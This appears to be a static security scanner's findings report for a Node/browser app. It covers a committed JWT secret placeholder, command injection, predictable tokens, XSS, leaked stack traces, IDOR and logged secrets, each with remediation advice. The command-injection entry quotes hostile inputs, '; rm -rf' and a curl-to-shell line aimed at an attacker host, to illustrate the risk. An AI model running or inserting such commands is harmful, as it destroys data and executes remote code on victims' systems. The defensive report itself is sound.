findings.title: Exposed secret: JWT Secret
findings.description: A JWT Secret was found in source code. Rotate immediately and move to environment variables.
findings.why: A committed credential lets anyone with repo access (or a leak of build artifacts, logs, CI env, or a stolen laptop) act as your service. Rotation is not optional.
findings.snippet: - JWT_****RET="make this a large list of random numbers and letters 20+"
findings.fix: Move this value to a .env file (and ensure .env is in .gitignore). Rotate the compromised credential.

findings.title: Command injection (exec)
findings.description: Shell command executed with user-controlled input.
findings.why: Shelling out with user input gives an attacker your process's shell. A single `; rm -rf` or `$(curl attacker.com/x | sh)` is often enough.
findings.fix: Avoid shell execution with user input. Use allowlists and sanitize inputs.

findings.title: Date.now() feeding a sessionid — predictable secret
findings.description: A non-cryptographic random source (Date.now()) is being used to produce sessionid. Predictable across processes and observable within minutes to a determined attacker.
findings.why: Math.random() and Date.now() are deterministic pseudo-random generators. An attacker who observes a few outputs — or knows roughly when a value was generated — can predict the next one. That is the difference between a secret and a value the attacker already knows. Every OTP/token/session tutorial uses one of these because they 'just work' at demo time.
findings.fix: Use crypto.randomBytes() / crypto.randomInt() (Node) or crypto.getRandomValues() (browser). For OTPs: crypto.randomInt(100000, 1000000). For tokens: crypto.randomBytes(32).toString('base64url').

findings.title: XSS (innerHTML)
findings.description: innerHTML is assigned from user-controlled input, which can lead to XSS.
findings.why: innerHTML parses its input as HTML — scripts, event handlers, iframes. If any user-controlled string reaches it unsanitized, XSS follows.
findings.fix: Use textContent for plain text, or sanitize trusted HTML with DOMPurify.

findings.title: Stack trace / error message leaked in HTTP response
findings.description: An error's stack or message is being sent back to the client. Stack traces disclose file paths, package versions, and internal function names; error messages often include ids and database internals.
findings.why: res.send(err.stack) is the debuggable version of a catch handler. It's how you make a demo feel responsive. In production it hands attackers your directory layout, dependency versions, database schema, and — often — the actual query that failed. Every internal-scan-turns-into-a-CVE story includes one of these lines.
findings.fix: Log the error server-side (pino/winston/sentry). Return a generic message: `res.status(500).json({ error: 'Internal server error' })`.

findings.title: IDOR — record looked up by user-supplied id without ownership check
findings.description: A route reads an id from the request and queries the database by that id, with no ownership predicate in the handler body. Any authenticated user can pass another user's id.
findings.why: Models can infer 'who are you' (auth is well-documented in tutorials) but not 'may you' (authorization depends on the app's data model). The result is the classic IDOR: /api/invoice/1234 → /api/invoice/1235 returns someone else's record. Every one of these is the same shape.
findings.fix: Add an ownership predicate to the query: `where: { id, userId: req.user.id }`. Never trust that authentication alone implies authorization.

findings.title: Sensitive data logged to console
findings.description: Logging sensitive fields can expose secrets in log files.
findings.why: Log aggregators (Datadog, Vercel, Sentry, Papertrail) ingest console output. A password or token logged once ends up in log storage for the retention window — often 30-90 days.
findings.fix: Remove logging of sensitive fields or redact them.

findings.title: Math.random() used for security-sensitive value
findings.description: Math.random() appears to be used for non-security tracking, UI, correlation, delay, animation, or logging identifiers.
findings.why: Math.random() is a predictable pseudo-random generator seeded from clock/context. An attacker who sees a few outputs can predict the next one — fine for animation, catastrophic for tokens or OTPs.
findings.fix: Use crypto.randomBytes() or crypto.getRandomValues() instead.

findings.title: XSS (innerHTML)
findings.description: innerHTML is assigned from a template literal without obvious user-controlled input. Review interpolated values, but this is lower risk when values are imported constants, icons, or static strings.
findings.why: innerHTML parses its input as HTML — scripts, event handlers, iframes. If any user-controlled string reaches it unsanitized, XSS follows.
findings.snippet: list.innerHTML = `<div class="py-10 text-center text-gray-400 italic">No ${type === "memories" ? "memories" : "profile e
findings.fix: Use textContent for plain text, or sanitize trusted HTML with DOMPurify.
